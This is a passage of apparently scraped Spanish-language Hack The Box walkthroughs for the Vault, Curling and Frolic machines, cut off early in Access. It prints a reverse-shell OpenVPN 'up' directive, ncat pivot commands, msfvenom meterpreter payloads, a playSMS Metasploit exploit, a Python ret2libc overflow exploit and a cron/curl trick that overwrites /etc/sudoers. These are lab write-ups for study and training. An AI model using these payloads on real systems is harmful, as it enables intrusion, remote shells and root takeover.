virbr0 (192.168.122.5, 192.168.122.4) y por ahora solo tenemos acceso a una 192.168.122.1.\nEscaneo de puertos por IP\nPodemos observar que la IP 192.168.122.4 tiene dos puertos abiertos 80 y 22, mientras que la otra IP 192.168.122.5 netcat no encontro ningun puerto abierto pero si esta activa la direccion IP.\nTUNELING SSH Vamos a traer localmente la IP 192.168.122.4 y su puerto 80 a nuestra maquina, para poder analizar el puerto 80.\n1  ssh -L 9090:192.168.122.4:80 dave@10.10.10.109   Ejecutamos el comando localmente.\nRevisamos si el puerto esta a la escucha localmente.\nProcedemos a abrir 127.0.0.1:9090 en firefox para ver que contenido tiene.\n/DNS Settings Esta pagina no existe por lo que no encontramos nada.\n/VPN Configuration Al parecer es una pagina para modificar y executar archivo ovpn\nSHELL INVERSA - OVPN En https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da nos muestran como se puede realizar una shell inversa con las siguiente configuracion:\n1 2 3 4 5  remote 192.168.1.245 ifconfig 10.200.0.2 10.200.0.1 dev tun script-security 2 up \u0026#34;/bin/bash -c \u0026#39;/bin/bash -i \u0026gt; /dev/tcp/192.168.1.218/8181 0\u0026lt;\u0026amp;1 2\u0026gt;\u0026amp;1\u0026amp;\u0026#39;\u0026#34;   Como referencia para realizar una shell inversa tomamos la documentacion de openvpn (https://openvpn.net/community-resources/reference-manual-for-openvpn-2-4/) para realizar algunos cambios, y este es el resultado:\n1 2 3 4 5  remote 192.168.122.4 dev tun nobind script-security 2 up \u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.122.1/9999 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;   Ya que la IP donde esta corriendo la pagina es 192.168.122.4 vamos a obtener una shell inversa de esa maquina, por lo que en la maquina dave (192.168.122.1) vamos a poner a la escucha netcat y asi obtener nuestra shell.\nPresionamos Test VPN\nY obtenemos nuestra shell inversa\nY nuestra bandera USER\nDe igual forma encontramos un archivo ssh que contiene credenciales de lo que parece ser ssh para el usuario dave.\n1 2 3  SSH dave 192.168.122.4 dave dav3gerous567   Intentamos logearnos y satisfactoriamente tenemos acceso por medio de ssh a 192.168.122.4.\nNuestro progreso hasta ahora\nEnumerando dentro de 192.168.122.4 encontramos en el historial de comandos (.bash_history) una conexion a 192.168.5.2 por el puerto 987 utilizando netcat por el puerto local 5555, tambien un escaneo de nmap a esa misma ip.\nIntentamos hacer un escaneo a esa IP 192.168.5.2.\nDentro de la carpeta /var/www/DNS encontramos un archivo llamado interfaces, vemos que se han agregado nuevas rutas estaticas a la tabla de enrutamiento.\nLa ruta de destino que tenga 192.168.5.0 sera redirigido a la puerta de enlace 192.168.122.5 por medio de la interfaz ens3.\nTercera IP (192.168.5.2) ROOT - FLAG Vamos a utilizar el mismo comando que esta en el historial para poder conectarnos a 192.168.5.2.\n1  ncat -l 5555 --sh-exec \u0026#34;ncat 192.168.5.2 987 --source-port=4444\u0026#34; \u0026amp;   Obtenemos nuestra shell en 192.168.5.2 y nuestra bandera root pero esta encriptada y necesitamos una clave.\nNuestra tercer maquina Anteriormente habiamos encontrado un archivo key en 192.168.122.1 con una frase, para extraer la informacion de nuestra bandera encriptada vamos trasferir el archivo a donde esta la key.\nPara escapar de la shell utilizamos:\n1  find / -exec sh -i \\;   Trensferir root.txt.gpg Para transferir nuestro archivo vamos a hacer algo similar a lo que hicimos para la conexion ssh a 192.168.5.2.\n1  ncat -l 5555 --sh-exec \u0026#34;ncat 192.168.5.2 987 --source-port=4444\u0026#34; \u0026amp;   1  scp -P 5555 dave@192.168.122.4:/home/dave/root.txt.gpg .   Ahora necesitamos transferirlo a 192.168.122.1 donde esta nuestra key, codificamos root.txt.gpg en base64.\nDecodificamos el archivo.\nDesencriptamos con la frase que esta en el archivo key y obtenemos nuestra bandera root.\n","description":"","id":94,"section":"posts","tags":["linux"],"title":"Hack The Box - Vault","uri":"https://sckull.github.io/posts/vault/"},{"content":"Curling es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n MASSCAN 1 2 3 4 5 6 7 8  root@sckull:~/htb/curling# masscan -p1-65535,U:1-65535 10.10.10.150 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.150 Discovered open port 22/tcp on 10.10.10.150   NMAP Escaneo al puerto 80 y 22\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  Starting Nmap 7.70 ( https://nmap.org ) Nmap scan report for 10.10.10.150 Host is up (0.29s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA) | 256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA) |_ 256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-generator: Joomla! - Open Source Content Management |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Home Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running: Linux 2.6.X OS CPE: cpe:/o:linux:linux_kernel:2.6 OS details: Linux 2.6.18 - 2.6.22 Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 22/tcp) HOP RTT ADDRESS 1 707.63 ms 10.10.12.1 2 707.82 ms 10.10.10.150 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 26.56 seconds   HTTP 80 Al visitar la pagina en el puerto 80 encontramos una pagina sencilla con varios post, en donde tambien vemos el nombre de Floris y Super User que puede referirse a administrator.\nGOBUSTER Escaneo de directorios y archivos html, php y txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  root@sckull:~/htb/curling# gobuster -u http://10.10.10.150/ -w /usr/share/wordlists/dirb/common.txt -q -np -x html,php,txt -t 30 /administrator (Status: 301) /bin (Status: 301) /cache (Status: 301) /components (Status: 301) /configuration.php (Status: 200) /images (Status: 301) /includes (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /language (Status: 301) /layouts (Status: 301) /libraries (Status: 301) /LICENSE.txt (Status: 200) /media (Status: 301) /modules (Status: 301) /plugins (Status: 301) /README.txt (Status: 200) /secret.txt (Status: 200) /server-status (Status: 403) /templates (Status: 301) /tmp (Status: 301) /web.config.txt (Status: 200)   Dentro de los directorios y archivos encontrados vemos uno no muy comun /secret.txt al visitar la direccion nos encontramos con una cadena en base64.\nAl decodificar dicha cadena nos devuelve Curling2018! posiblemente una contraseña para uno de los dos usuarios administrator y floris. Al intentar con el usuario floris y la contraseña en /secret.txt nos logramos logear al panel de administracion de joomla.\n1 2  Username: floris Password: Curling2018!   SHELL Ahora que tenemos acceso al panel de administracion podemos intentar obtener una shell mediante una extension mod_simplefileupload. Primero debemos de generar nuestro payload con msfvenom y poner a la escucha nuestra maquina con multi/handler.\nhttps://www.youtube.com/watch?v=fh7ifo-Wldo\nMetasploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  root@sckull:~/htb/curling# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.12.11 LPORT=7878 -o batman.php [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload [-] No arch selected, selecting arch: php from the payload No encoder or badchars specified, outputting raw payload Payload size: 1112 bytes Saved as: batman.php root@sckull:~/htb/curling# msfconsole -q msf5 \u0026gt; use exploit/multi/handler msf5 exploit(multi/handler) \u0026gt; set payload php/meterpreter/reverse_tcp payload =\u0026gt; php/meterpreter/reverse_tcp msf5 exploit(multi/handler) \u0026gt; set LHOST 10.10.12.11 LHOST =\u0026gt; 10.10.12.11 msf5 exploit(multi/handler) \u0026gt; set LPORT 7878 LPORT =\u0026gt; 7878 msf5 exploit(multi/handler) \u0026gt; exploit [*] Started reverse TCP handler on 10.10.12.11:7878   Para subir nuestra extension nos dirigmos a Extentions \u0026gt; Manage \u0026gt; Install \u0026gt; Upload Package File, elegimos nuestro paquete.\nLuego nos dirigimos a http://10.10.10.150/modules/mod_simplefileuploadv1.3/elements/udd.php, procedemos a subir nuestro payload y visitar la pagina donde se encuentra nuestro payload.\nY obtenemos nuestra sesion meterpreter.\nMetasploit - Sesion Meterpreter En la carpeta /home/floris encontramos el flag user.txt pero no tenemos permisos para leerlo, pero encontramos un archivo con el nombre de password_backup.\nUtilizamos xxd para verificar el archivo, al consulatar la firma de archivos encontramos que es un archivo de tipo bzip2.\nhttps://www.garykessler.net/library/file_sigs.html\nUtilizamos nuevamente xxd para escribir este archivo en /tmp.\n1  xxd -r /home/floris/password_backup \u0026gt; /tmp/backup.bz2   Pasamos nuestro archivo a base64 para poder extraerlo localmente.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  root@sckull:~/htb/curling# cat base64 | base64 -d \u0026gt; backup.bz2 root@sckull:~/htb/curling# bzip2 -d backup.bz2 root@sckull:~/htb/curling# ls backup base64 batman.php mod_simplefileuploadJ30v1.3.5.zip root@sckull:~/htb/curling# cat backup �l[password�r�BZh91AY\u0026amp;SY6Ǎ����@@!PtD�� t\u0026#34;d�hhOPIS@��6��8ET\u0026gt;P@�#I bՃ|3��x���������(*N�\u0026amp;�H��k1��x��\u0026#34;�{�ೱ��]��B@�6�m��root@sckull:~/htb/curling# file backup backup: gzip compressed data, was \u0026#34;password\u0026#34;, last modified: Tue May 22 19:16:20 2018, from Unix, original size 141 root@sckull:~/htb/curling# mv backup file.gz root@sckull:~/htb/curling# gunzip file.gz root@sckull:~/htb/curling# ls base64 batman.php file mod_simplefileuploadJ30v1.3.5.zip root@sckull:~/htb/curling# file file file: bzip2 compressed data, block size = 900k root@sckull:~/htb/curling# bzip2 -d file.bz2 root@sckull:~/htb/curling# ls base64 batman.php file mod_simplefileuploadJ30v1.3.5.zip root@sckull:~/htb/curling# cat file password.txt0000644000000000000000000000002313301066143012147 0ustar rootroot5d\u0026lt;wdCbdZu)|hChXll root@sckull:~/htb/curling# file file file: POSIX tar archive (GNU) root@sckull:~/htb/curling# tar xvf file password.txt root@sckull:~/htb/curling# cat password.txt 5d\u0026lt;wdCbdZu)|hChXll root@sckull:~/htb/curling#   Finalmente despues de pasar por varios archivos nos encontramos con una contraseña dentro del archivo password.txt, vamos a utilizarla para el usuario Floris en el servicio ssh y obtenemos nuestra bandera user.txt.\nPRIVILEGE ESCALATION Realizamos una enumeracion de posibles exploits con linux-exploit-suggester dentro del directorio /tmp, esto para facilitarnos una escalada de privilegios.\nhttps://initblog.com/2019/dirty-sock/\nEncontramos el CVE-2019-7304 de dirty_sock que podria ayudarnos para escalar privilegios, descargamos y ejecutamos nuestro exploit en /tmp, el cual nos creara un usario con privilegios root.\nCambiamos de usuario con su al usuario dirty_sock, y obtenemos privilegios root y la bandera root.txt.\nPRIVILEGE ESCALATION v2 Para esta Curling tenemos otra forma de obtener root, para ello utilizamos pspy para ver los cron que se ejecutan.\nObservamos que hay uno cronjob que ejecuta un comando el cual copia un archivo llamado default.txt a /home/floris/admin-area/input.\n1  cat /root/default.txt \u0026gt; /home/floris/admin-area/input   Y otro que hace uso de curl y mediante un archivo hace una consulta el cual lo guarda en report.\n1  curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report   Sabiendo lo anterior podemos crear un archivo sudoers que contenga permisos de usuario root para el usuario floris, utilizar un servidor local para que el cron haga la consulta, descargue el archivo y lo guarde en el archivo de sudoers.\nsudoers\nPython HTTP Server Editamos el archivo input con lo siguiente:\n1 2  url = \u0026#34;http://10.10.12.11/sudoers\u0026#34; output = \u0026#34;/etc/sudoers\u0026#34;   ","description":"","id":95,"section":"posts","tags":["linux"],"title":"Hack The Box - Curling","uri":"https://sckull.github.io/posts/curling/"},{"content":"Frolic es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Masscan Realizamos un escaneo de puertos udp y tcp con masscan.\n1 2 3 4 5 6 7 8  masscan -p1-65535,U:1-65535 10.10.10.111 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 139/tcp on 10.10.10.111 Discovered open port 9999/tcp on 10.10.10.111   NMAP Escaneando el servicio que corre en los puertos encontrados con masscan.\n1 2 3 4 5 6 7 8 9 10 11  Starting Nmap 7.70 ( https://nmap.org ) Nmap scan report for 10.10.10.111 Host is up (1.0s latency). PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 9999/tcp open http nginx 1.10.3 (Ubuntu) Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.19 seconds   SAMBA Un escaneo de puntos compartidos con smbclient, no encontramos mucho que nos pudiese ayudar.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  root@sckull:~# smbclient -L 10.10.10.111 Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers IPC$ IPC IPC Service (frolic server (Samba, Ubuntu)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP FRIENDZONE   HTTP Un escaneo de rutas y archivos con gobuster al puerto 9999.\n1 2 3 4 5 6  root@sckull:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://10.10.10.111:9999/ -q -np -x php,html,txt,js -t 15 /admin (Status: 301) /backup (Status: 301) /dev (Status: 301) /test (Status: 301) /playsms (Status: 301)   Dentro de la ruta /admin encontramos un panel de administracion que necesita un usuario y contraseña\nEn /backup encontramos password.txt y user.txt que contienen una contraseña y usuario respectivamente:\n1 2  passsword.txt -\u0026gt; password - imnothuman user.txt -\u0026gt; user - admin   En la ruta /dev y /loop no encontramos nada, dentro de /test informacion de la version de php corriendo en la maquina.\nFinalmente en /playsms encontramos un login:\n/admin Analizando el codigo de la ruta /admin encontramos que contiene un archivo de javascript llamado login.js:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Crack me :|\u0026lt;/title\u0026gt; \u0026lt;!-- Include CSS File Here --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/style.css\u0026#34;/\u0026gt; \u0026lt;!-- Include JS File Here --\u0026gt; \u0026lt;script src=\u0026#34;js/login.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;main\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;c\u0026#39;mon i m hackable\u0026lt;/h2\u0026gt; \u0026lt;form id=\u0026#34;form_id\u0026#34; method=\u0026#34;post\u0026#34; name=\u0026#34;myform\u0026#34;\u0026gt; \u0026lt;label\u0026gt;User Name :\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; id=\u0026#34;username\u0026#34;/\u0026gt; \u0026lt;label\u0026gt;Password :\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34;/\u0026gt; \u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;Login\u0026#34; id=\u0026#34;submit\u0026#34; onclick=\u0026#34;validate()\u0026#34;/\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;span\u0026gt;\u0026lt;b class=\u0026#34;note\u0026#34;\u0026gt;Note : Nothing\u0026lt;/b\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   Y dentro de login.js encontramos una condicional que contiene un usuario y contraseña, tambien una redireccion hacia success.html:\n1 2  usuario: admin contraseña: superduperlooperpassword_lol   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  var attempt = 3; // Variable to count number of attempts. // Below function Executes on click of login button. function validate(){ var username = document.getElementById(\u0026#34;username\u0026#34;).value; var password = document.getElementById(\u0026#34;password\u0026#34;).value; if ( username == \u0026#34;admin\u0026#34; \u0026amp;\u0026amp; password == \u0026#34;superduperlooperpassword_lol\u0026#34;){ alert (\u0026#34;Login successfully\u0026#34;); window.location = \u0026#34;success.html\u0026#34;; // Redirecting to other page. return false; } else{ attempt --;// Decrementing by one. alert(\u0026#34;You have left \u0026#34;+attempt+\u0026#34; attempt;\u0026#34;); // Disabling fields after 3 attempts. if( attempt == 0){ document.getElementById(\u0026#34;username\u0026#34;).disabled = true; document.getElementById(\u0026#34;password\u0026#34;).disabled = true; document.getElementById(\u0026#34;submit\u0026#34;).disabled = true; return false; } } }   Dentro de success.html encontramos caracteres extraños:\ntilizando la pagina https://www.dcode.fr/ook-language para decodificar lo anterior:\nNos muestra el mensaje: \u0026lsquo;Nothing here check /asdiSIAJJ0QWE9JAS\u0026rsquo; por lo que podria ser una ruta dentro de la pagina al visitar dicha ruta nos encontramos con lo siguiente:\n1 2 3 4 5 6 7  UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA  En este caso un archivo codificado en base64 y lo agregamos a un nuevo archivo, verificamos que tipo de archivo es con \u0026lsquo;file\u0026rsquo; y vemos que el archivo decodificado (file_decode) es un archivo zip por lo que le cambiamos el nombre y le agregamos \u0026lsquo;.zip\u0026rsquo; al final:\n1 2 3 4 5  root@sckull:~/htb/frolic# echo \u0026#34;UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA\u0026#34; | base64 -d \u0026gt; file.txt root@sckull:~/htb/frolic# file file.txt file.txt: Zip archive data, at least v2.0 to extract root@sckull:~/htb/frolic# root@sckull:~/htb/frolic# mv file.txt file.zip   Luego al intentar descomprimir el archivo file.zip nos pide una contraseña, en este caso la contraseña es \u0026lsquo;password\u0026rsquo; (contraseñas comunes), nos devuelve un archivo index.php.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  root@sckull:~/htb/frolic# 7z x file.zip 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 Scanning the drive for archives: 1 file, 360 bytes (1 KiB) Extracting archive: file.zip -- Path = file.zip Type = zip Physical Size = 360 Enter password (will not be echoed):password Everything is Ok Size: 617 Compressed: 360 root@sckull:~/htb/frolic# ls file.zip index.php   En el interior de index.php nos encontramos con texto en HEX al pasarlo a texto nos devuelve otra vez un texto en base64:\n1  4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a  1 2 3 4 5  root@sckull:~/htb/frolic# echo 4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a | xxd -r -p KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==   Al decodificar el texto en base64 nos devuelve texto en lenguaje \u0026lsquo;brainfuck\u0026rsquo;:\n1 2 3 4 5 6  root@sckull:~/htb/frolic# echo KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwrKysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysgK1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0tLS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg== | base64 -d +++++ +++++ [-\u0026gt;++ +++++ +++\u0026lt;] \u0026gt;++++ +.--- --.++ +++++ .\u0026lt;+++ [-\u0026gt;++ +\u0026lt;]\u0026gt;+ ++.\u0026lt;+ ++[-\u0026gt; ---\u0026lt;] \u0026gt;---- --.-- ----- .\u0026lt;+++ +[-\u0026gt;+ +++\u0026lt;] \u0026gt;+++. \u0026lt;+++[ -\u0026gt;--- \u0026lt;]\u0026gt;-- .\u0026lt;+++ [-\u0026gt;++ +\u0026lt;]\u0026gt;+ .---. \u0026lt;+++[ -\u0026gt;--- \u0026lt;]\u0026gt;-- ----. \u0026lt;++++ [-\u0026gt;++ ++\u0026lt;]\u0026gt; ++..\u0026lt; root@sckull:~/htb/frolic#   Decodificando el mensaje con https://www.dcode.fr/brainfuck-language:\nIntentamos utilizar idkwhatispass como contraseña en /playsms y el usuario admin y nos logramos logear dentro de la plataforma.\nPara esta plataforma (playsms) encontramos un exploit (exploit/multi/http/playsms_uploadcsv_exec) dentro de metasploit y lo utilizamos con las credenciales que habiamos encontrado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  msf5 \u0026gt; use exploit/multi/http/playsms_uploadcsv_exec msf5 exploit(multi/http/playsms_uploadcsv_exec) \u0026gt; show options Module options (exploit/multi/http/playsms_uploadcsv_exec): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD idkwhatispass yes Password to authenticate with Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.111 yes The target address range or CIDR identifier RPORT 9999 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI /playsms yes Base playsms directory path USERNAME admin yes Username to authenticate with VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.X.X yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 PlaySMS 1.4 msf5 exploit(multi/http/playsms_uploadcsv_exec) \u0026gt; exploit [*] Started reverse TCP handler on 10.10.X.X:4444 [+] Authentication successful: admin:idkwhatispass [*] Sending stage (38247 bytes) to 10.10.10.111 [*] Meterpreter session 1 opened (10.10.X.X:4444 -\u0026gt; 10.10.10.111:33574) meterpreter \u0026gt; shell Process 1765 created. Channel 0 created. cd /home/ayush ls user.txt cat user.txt 2ab95909cf509f85a6f476b59a0c2fe0   Obtenemos nuestra bandera \u0026lsquo;user.txt\u0026rsquo;.\nPRIVILEGE ESCALATION - b0f En los archivos de ayush encontramos un archivo llamado .rop que tiene permisos del usuario root.\n1 2 3 4 5 6 7  www-data@frolic:/home/ayush/.binary$ ls -lah ls -lah total 16K drwxrwxr-x 2 ayush ayush 4.0K Sep 25 02:43 . drwxr-xr-x 3 ayush ayush 4.0K Sep 25 02:00 .. -rwsr-xr-x 1 root root 7.4K Sep 25 00:59 rop www-data@frolic:/home/ayush/.binary$   Utilizando el siguiente script obtenemos privilegios root y nuestra bandera \u0026lsquo;root.txt\u0026rsquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  from struct import pack from subprocess import call system = 0xb7e19000 + 0x0003ada0 exit = 0xb7e19000 + 0x0002e9d0 binsh = 0xb7e19000 + 0x0015ba0b def p32(num): return pack(\u0026#34;\u0026lt;I\u0026#34;,num) buf = \u0026#34;A\u0026#34;*52 buf += p32(system) buf += p32(exit) buf += p32(binsh) call([\u0026#34;/home/ayush/.binary/rop\u0026#34;, buf])   1 2 3 4 5 6 7 8 9 10 11 12 13  www-data@frolic:/tmp$ curl 10.10.15.46:80/bf.py -o bf.py www-data@frolic:/tmp$ ls ls bf.py www-data@frolic:/tmp$ python bf.py python bf.py # whoami; id; wc -c /root/root.txt; cat /root/root.txt whoami; id; wc -c /root/root.txt; cat /root/root.txt root uid=0(root) gid=33(www-data) groups=33(www-data) 33 /root/root.txt 85d3fdf03f969892538ba9a731826222 #   ","description":"","id":96,"section":"posts","tags":["linux"],"title":"Hack The Box - Frolic","uri":"https://sckull.github.io/posts/frolic/"},{"content":"   Access es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\nNMAP Utilizando la herramienta nmap para escaneo de puertos y servicios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53  Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-29 21:08 CST Initiating SYN Stealth Scan at 21:08 Scanning 10.10.10.98 (10.10.10.98) [65535 ports] Discovered open port 23/tcp on 10.10.10.98 Discovered open port 80/tcp on 10.10.10.98 Discovered open port 21/tcp on 10.10.10.98 Completed SYN Stealth Scan at 21:15, 438.01s elapsed (65535 total ports) Initiating Service scan at 21:15 Scanning 3 services on 10.10.10.98 (10.10.10.98) Completed Service scan at 21:18, 160.97s elapsed (3 services on 1 host) Completed NSE at 21:19, 1.78s elapsed Nmap scan report for 10.10.10.98 (10.10.10.98) Host is up (0.37s latency). Not shown: 65532 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can\u0026#39;t get directory listing: TIMEOUT | ftp-syst: |_ SYST: Windows_NT 23/tcp open telnet? 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: MegaCorp Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: specialized|general purpose|phone Running (JUST GUESSING): Microsoft Windows 7|8|Phone|2008|8.1|Vista (91%) OS CPE: cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 Aggressive OS guesses: Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows 8.1 Update 1 (91%), 